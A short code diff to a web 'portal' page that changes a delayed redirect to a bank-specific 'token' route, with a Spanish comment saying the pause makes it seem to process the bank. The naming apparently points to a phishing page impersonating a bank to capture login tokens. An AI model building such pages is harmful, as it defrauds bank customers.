@@ -78,7 +78,7 @@ export default function PortalPage() {
 
       // Pequeña espera para que parezca que procesa el banco
       setTimeout(() => {
-        router.push("/portal/token-ban");
+        router.push("/portal/token-banreservas");
       }, 1500);
 
     } catch (error) {
